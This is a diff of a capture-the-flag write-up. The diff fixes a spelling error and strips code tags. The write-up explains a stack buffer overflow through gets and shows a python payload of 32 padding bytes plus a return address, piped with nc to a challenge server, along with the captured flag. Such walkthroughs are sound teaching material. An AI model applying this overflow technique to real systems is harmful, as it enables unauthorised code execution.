@@ -27,7 +27,7 @@ We can exploit the _gets_ library function to overwrite the return address of _e
 
 The stack can be visualised like this [\[3\]](http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl)
 
-ArguementsToFunctionIfAny | ReturnAddress | PrevEBP | SpaceAllocatedByFunction |-->StackGrowth
+ArgumentsToFunctionIfAny | ReturnAddress | PrevEBP | SpaceAllocatedByFunction |-->StackGrowth
 
 * EBP points to address where the previous value of EBP is stored.(Line 182 and 183)
 
@@ -43,15 +43,12 @@ Hence the input should be "A"*(28 + 4) + "\x9d\x84\x04\x08"
 
 This command would output the same.
 
-<code>
 > $ python -c 'print "A"*32+"\x9d\x84\x04\x08" '
-</code>
+
 
 Thus the final exploit:<br/>
-<code>
 > $ python -c 'print "A"*32+"\x9d\x84\x04\x08" ' | nc 212.71.235.214 2000<br/>
 > flag{this\_is\_just\_the\_beginning}
-</code>
 
 ###Links:<br/>
 1. [http://man7.org/linux/man-pages/man1/objdump.1.html](http://man7.org/linux/man-pages/man1/objdump.1.html)
